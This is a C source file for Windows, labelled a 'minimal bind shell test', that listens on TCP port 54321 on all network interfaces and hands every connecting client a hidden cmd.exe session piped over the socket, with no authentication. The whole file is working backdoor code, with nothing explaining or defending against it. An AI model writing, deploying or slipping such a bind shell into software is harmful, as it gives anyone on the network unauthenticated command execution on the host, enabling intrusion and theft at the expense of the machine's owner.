// Minimal bind shell test
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

int main() {
    WSADATA wd;
    if (WSAStartup(MAKEWORD(2,2), &wd) != 0) {
        MessageBoxA(NULL, "WSAStartup failed", "Debug", MB_OK);
        return 1;
    }
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        MessageBoxA(NULL, "socket failed", "Debug", MB_OK);
        WSACleanup();
        return 1;
    }
    int port = 54321;
    struct sockaddr_in a;
    a.sin_family = AF_INET;
    a.sin_port = htons((u_short)port);
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
    if (bind(s, (struct sockaddr*)&a, sizeof(a)) == SOCKET_ERROR) {
        MessageBoxA(NULL, "bind failed", "Debug", MB_OK);
        closesocket(s);
        WSACleanup();
        return 1;
    }
    if (listen(s, 10) == SOCKET_ERROR) {
        MessageBoxA(NULL, "listen failed", "Debug", MB_OK);
        closesocket(s);
        WSACleanup();
        return 1;
    }
    // Accept one connection, launch cmd, pipe
    while (1) {
        SOCKET cl = accept(s, NULL, NULL);
        if (cl == INVALID_SOCKET) break;
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE;
        HANDLE hIR, hIW, hOR, hOW;
        if (!CreatePipe(&hIR, &hIW, &sa, 0)) { closesocket(cl); continue; }
        if (!CreatePipe(&hOR, &hOW, &sa, 0)) { CloseHandle(hIR); CloseHandle(hIW); closesocket(cl); continue; }
        
        SetHandleInformation(hIW, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(hOR, HANDLE_FLAG_INHERIT, 0);
        
        PROCESS_INFORMATION pi;
        STARTUPINFOA si;
        memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = hIR; si.hStdOutput = hOW; si.hStdError = hOW;
        
        if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hIR); CloseHandle(hIW); CloseHandle(hOR); CloseHandle(hOW);
            closesocket(cl); continue;
        }
        
        CloseHandle(hIR); CloseHandle(hOW);
        
        char buf[4096];
        fd_set rfds; struct timeval tv;
        for (;;) {
            FD_ZERO(&rfds); FD_SET(cl, &rfds);
            tv.tv_sec = 0; tv.tv_usec = 100000;
            int sel = select(0, &rfds, NULL, NULL, &tv);
            if (sel < 0) break;
            if (sel > 0 && FD_ISSET(cl, &rfds)) {
                int ret = recv(cl, buf, sizeof(buf), 0);
                if (ret <= 0) break;
                DWORD n; WriteFile(hIW, buf, (DWORD)ret, &n, NULL);
            }
            DWORD avail = 0;
            if (PeekNamedPipe(hOR, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                DWORD tr = avail < sizeof(buf) ? avail : (DWORD)sizeof(buf);
                DWORD n;
                if (ReadFile(hOR, buf, tr, &n, NULL) && n > 0) {
                    send(cl, buf, (int)n, 0);
                }
            }
        }
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        CloseHandle(hIW); CloseHandle(hOR);
        closesocket(cl);
    }
    closesocket(s);
    WSACleanup();
    return 0;
}
